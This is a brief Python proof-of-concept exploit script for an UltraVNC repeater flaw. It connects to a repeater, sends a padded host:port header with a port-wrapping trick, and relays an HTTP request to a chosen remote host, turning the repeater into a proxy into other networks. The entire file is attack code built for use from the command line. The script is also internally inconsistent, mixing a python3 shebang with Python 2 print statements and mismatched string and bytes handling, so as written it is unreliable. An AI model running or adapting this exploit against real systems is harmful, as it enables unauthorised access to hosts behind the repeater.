#! /usr/bin/python3

# Stargate UltraVNC Repeater vulnerability POC
# by Yonathan Klijnsma & Dan Tentler

import socket
import sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Arguments
host = sys.argv[1]
port = int(sys.argv[2])
remotehost = str(sys.argv[3])
remoteport = int(sys.argv[4])
uri = str(sys.argv[5])

s.connect((host,port))
if s.recv(12).decode().strip() != 'RFB 000.000':
	print '[!] Host is NOT an UltraVNC repeater'
else:
	print '[+] Connected to UltraVNC repeater at %s:%d' % (host, port)

# Wrap ports
if len(str(remoteport)) < 4:
    remoteport += 65536


header = remotehost + ':' + str(remoteport)
headerlen = len(header)
multiplier = 250 - int(headerlen)
padding = '\x00' * int(multiplier)
comms = header + padding
s.send(comms.encode())

payload = 'GET %s HTTP/1.0\r\n\r\n' % uri
print "[+] Proxying HTTP request to: %s%s" % (remotehost, uri)
s.send(payload)
print "[+] Server response:\n" + s.recv(1024).decode()